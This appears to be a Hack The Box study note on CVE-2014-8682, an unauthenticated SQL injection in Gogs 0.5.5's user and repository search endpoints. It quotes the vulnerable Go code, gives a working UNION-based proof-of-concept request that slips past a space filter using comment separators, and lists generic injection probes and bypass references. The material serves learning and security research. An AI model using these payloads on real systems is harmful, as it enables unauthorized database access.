Sql Injection @health from HTB

Vulnerable application is Gogs Git(A selft hosted git service)

App version 0.5.5 beta

Explaining vulnerability

Unauthenticated SQL Injection at
Users and repos search parameter 'q'

Endpoints
```
 /api/v1/users/search
 /api/v1/repos/search
 ```
CVE-2014-8682

Vulnerable Code Section

```go
models/user.go:
[...]
// SearchUserByName returns given number of users whose name contains
keyword.
func SearchUserByName(opt SearchOption) (us []*User, err error) {
    opt.Keyword = FilterSQLInject(opt.Keyword)
    if len(opt.Keyword) == 0 {
        return us, nil
    }
    opt.Keyword = strings.ToLower(opt.Keyword)

    us = make([]*User, 0, opt.Limit)
    err = x.Limit(opt.Limit).Where("type=0").And("lower_name like '%" +
opt.Keyword + "%'").Find(&us)
    return us, err
}
[...]
```
Reson for the Vulnerability

The vulnerability exists because of a string concatination in the SQL query with user supplied data. Because of the SQL filter at the method entry, attackers can't use spaces (0x20) and since v0.5.6.1025-g83283b commas are also filtered.

POC

Request
```
http://www.example.com/api/v1/users/search?q='/**/and/**/false)/**/union/**/
select/**/null,null,@@version,null,null,null,null,null,null,null,null,null,null,
null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from
/**/mysql.db/**/where/**/('%25'%3D'
```
Response:

```json
{"data":[{"username":"5.5.40-0ubuntu0.14.04.1","avatar":
"//1.gravatar.com/avatar/"}],"ok":
```
Referance [https://www.exploit-db.com/exploits/35238](https://www.exploit-db.com/exploits/35238)

Sql injection filter bypass techniques

Reference 1 : [https://portswigger.net/web-security/sql-injection/union-attacks](https://portswigger.net/web-security/sql-injection/union-attacks)

Reference 2: [https://null-byte.wonderhowto.com/how-to/sql-injection-101-avoid-detection-bypass-defenses-0184918/](https://null-byte.wonderhowto.com/how-to/sql-injection-101-avoid-detection-bypass-defenses-0184918/)

Reference 3: [https://programmer.ink/think/sql-injection-bypass.html](https://programmer.ink/think/sql-injection-bypass.html)

Sql union based injection

Reference [https://crashtest-security.com/sql-injection-union/](https://crashtest-security.com/sql-injection-union/)

If order was failed then do with null injection

```
Order by 1--
UNION SELECT NULL--
UNION SELECT NULL,NULL-- 
```